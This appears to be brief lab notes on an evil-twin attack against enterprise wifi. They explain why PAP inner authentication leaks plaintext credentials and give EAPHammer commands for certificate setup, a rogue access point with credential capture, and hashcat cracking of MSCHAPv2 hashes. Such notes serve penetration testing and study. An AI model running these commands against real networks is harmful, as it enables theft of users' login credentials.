As the EAP Server, EAPHammer acts as the endpoint of the TLS tunnel. It decrypts the incoming Phase 2 traffic.
Since PAP does not involve hashing or challenge-responses (unlike MSCHAPv2), the plaintext testuser and testpass are
exposed the moment the tunnel is stripped away.

generate certs

./eaphammer --cert-wizard

set up evil twin

./eaphammer --interface $interface --essid $ap_name --creds --hw-mode g --channel $channel

If mschapv2 is used as the inner auth method the eaphammer command will output a hash. this can be cracked with haschat

hashcat -m 5500 captured.txt /usr/share/wordlists/rockyou.txt --force
